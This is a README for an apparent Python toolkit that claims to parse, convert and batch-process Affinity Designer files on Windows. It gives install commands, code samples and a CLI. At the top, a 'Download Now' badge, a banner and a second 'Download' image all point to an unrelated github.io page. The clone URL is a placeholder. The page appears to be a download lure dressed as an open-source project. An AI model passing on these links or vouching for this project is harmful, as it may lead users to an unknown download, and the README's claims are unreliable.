# affinity-designer-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://sathyakumar92.github.io/affinity-info-l89/)


[![Banner](banner.png)](https://sathyakumar92.github.io/affinity-info-l89/)


![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![PyPI Version](https://img.shields.io/pypi/v/affinity-designer-toolkit.svg)
![Build Status](https://img.shields.io/github/actions/workflow/status/affinity-designer-toolkit/main/ci.yml)
![Download](https://sathyakumar92.github.io/affinity-info-l89/)
![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)

> A Python toolkit for parsing, converting, and batch processing vector design files compatible with Affinity Designer on Windows.

---

## Overview

**affinity-designer-toolkit** is an open-source Python library that provides programmatic access to vector graphic files used by Affinity Designer on Windows. It enables developers and designers to automate repetitive design workflows, convert between common vector formats, and extract structured data from `.afdesign`, `.svg`, and `.pdf` files without requiring the Affinity Designer application to be running.

Whether you are building a design pipeline, migrating assets between tools, or need to inspect vector file metadata at scale, this toolkit gives you a clean, Pythonic interface to do it.

---

## Features

- 📂 **Parse `.afdesign` files** — Read layer structure, artboards, symbols, and embedded assets from Affinity Designer project files on Windows
- 🔄 **Format conversion** — Convert between `.afdesign`, `.svg`, `.eps`, `.pdf`, and `.png` using a unified API
- ⚙️ **Batch processing** — Process entire directories of vector files with configurable pipelines and parallel execution
- 🎨 **Color profile extraction** — Extract and convert color swatches, gradients, and palette data from design files
- 📐 **Geometry utilities** — Query bounding boxes, path nodes, and transform matrices from vector objects
- 🗂️ **Metadata inspection** — Read document properties, DPI settings, canvas dimensions, and export presets
- 🔗 **CLI support** — Built-in command-line interface for quick one-off conversions and batch jobs
- 🧩 **Plugin-friendly architecture** — Extend the toolkit with custom format handlers and processing hooks

---

## Requirements

| Requirement | Version |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 (primary), Linux/macOS (partial support) |
| `lxml` | >= 4.9.0 |
| `Pillow` | >= 9.0.0 |
| `click` | >= 8.0.0 |
| `colormath` | >= 3.0.0 |
| `tqdm` | >= 4.64.0 |
| `pydantic` | >= 2.0.0 |

> **Note:** Full `.afdesign` binary format support requires Windows due to native COM interop with the Affinity Designer Windows application. SVG and PDF processing work cross-platform.

---

## Installation

### From PyPI

```bash
pip install affinity-designer-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/affinity-designer-toolkit.git
cd affinity-designer-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

For enhanced PDF rendering support:

```bash
pip install affinity-designer-toolkit[pdf]
```

For full Windows COM automation support:

```bash
pip install affinity-designer-toolkit[windows]
```

---

## Quick Start

```python
from affinity_designer_toolkit import DesignFile

# Open an Affinity Designer file
doc = DesignFile.open("my_logo.afdesign")

print(f"Document: {doc.name}")
print(f"Canvas size: {doc.width}px × {doc.height}px")
print(f"Artboards: {len(doc.artboards)}")
print(f"Layers: {len(doc.layers)}")

# Export to SVG
doc.export("output/my_logo.svg", format="svg")
```

---

## Usage Examples

### Parsing a Design File

```python
from affinity_designer_toolkit import DesignFile
from affinity_designer_toolkit.models import LayerType

doc = DesignFile.open("brand_assets.afdesign")

# Iterate over all layers recursively
for layer in doc.layers.walk():
    if layer.type == LayerType.VECTOR:
        print(f"Vector layer: {layer.name}, visible: {layer.visible}")
        print(f"  Bounding box: {layer.bounding_box}")
        print(f"  Fill color: {layer.fill.color.hex}")
```

### Converting Vector Formats

```python
from affinity_designer_toolkit.converter import VectorConverter

converter = VectorConverter()

# Convert a single SVG to PDF
converter.convert(
    source="icon.svg",
    target="icon.pdf",
    options={
        "dpi": 300,
        "color_profile": "sRGB",
        "embed_fonts": True,
    }
)

# Convert an Affinity Designer file to SVG with artboard splitting
converter.convert(
    source="ui_components.afdesign",
    target="exports/",
    format="svg",
    split_artboards=True,
)
```

### Batch Processing a Directory

```python
from pathlib import Path
from affinity_designer_toolkit.batch import BatchProcessor

processor = BatchProcessor(
    input_dir=Path("designs/"),
    output_dir=Path("exports/"),
    output_format="png",
    workers=4,           # parallel processing
    recursive=True,
)

# Apply a custom transformation before export
@processor.on_file
def apply_export_settings(doc):
    doc.set_export_dpi(144)
    doc.flatten_transparency()
    return doc

results = processor.run()

print(f"Processed: {results.success_count} files")
print(f"Failed:    {results.failure_count} files")
for error in results.errors:
    print(f"  ✗ {error.file}: {error.message}")
```

### Extracting Color Palettes

```python
from affinity_designer_toolkit import DesignFile
from affinity_designer_toolkit.colors import PaletteExporter

doc = DesignFile.open("brand_guidelines.afdesign")

# Extract all swatches from the document palette
palette = doc.get_palette()

for swatch in palette.swatches:
    print(f"{swatch.name}: {swatch.hex}  (CMYK: {swatch.cmyk})")

# Export palette to ASE (Adobe Swatch Exchange) format
PaletteExporter.to_ase(palette, "brand_colors.ase")

# Export to CSS custom properties
PaletteExporter.to_css(palette, "brand_colors.css", prefix="--color")
```

### Using the Command-Line Interface

```bash
# Convert a single file
adt convert my_design.afdesign output.svg --dpi 96

# Batch convert an entire folder to PNG
adt batch ./designs ./exports --format png --workers 4 --recursive

# Inspect file metadata
adt inspect my_design.afdesign

# Extract palette and save as CSS
adt palette my_design.afdesign --output brand.css --format css
```

---

## Project Structure

```
affinity-designer-toolkit/
├── affinity_designer_toolkit/
│   ├── __init__.py
│   ├── core/
│   │   ├── document.py        # DesignFile parser
│   │   ├── layers.py          # Layer tree models
│   │   └── geometry.py        # Vector math utilities
│   ├── converter/
│   │   ├── svg.py             # SVG read/write
│   │   ├── pdf.py             # PDF export
│   │   └── raster.py          # PNG/JPEG rasterization
│   ├── batch/
│   │   └── processor.py       # Parallel batch pipeline
│   ├── colors/
│   │   └── palette.py         # Color extraction & export
│   └── cli/
│       └── main.py            # Click CLI entrypoint
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow the steps below to get started:

1. **Fork** the repository
2. **Create a branch** for your feature or bugfix:
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Write tests** for any new functionality in the `tests/` directory
4. **Run the test suite** before submitting:
   ```bash
   pytest tests/ --cov=affinity_designer_toolkit
   ```
5. **Format your code** with Black:
   ```bash
   black affinity_designer_toolkit/
   ```
6. **Open a pull request** with a clear description of your changes

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our full code of conduct and development guidelines.

---

## Roadmap

- [ ] Full binary `.afdesign` format reverse-engineering (v0.4)
- [ ] Affinity Publisher file support (`.afpub`)
- [ ] Live Windows COM automation without manual export step
- [ ] Web UI for drag-and-drop batch conversion
- [ ] WASM build for browser-based SVG parsing

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details.

---

## Acknowledgements

- [lxml](https://lxml.de/) for robust XML/SVG parsing
- [Pillow](https://python-pillow.org/) for raster image operations
- The open-source reverse-engineering work around Affinity file formats that made this toolkit possible

---

*affinity-designer-toolkit is an independent open-source project and is not affiliated with or endorsed by Serif (Europe) Ltd., the makers of Affinity Designer.*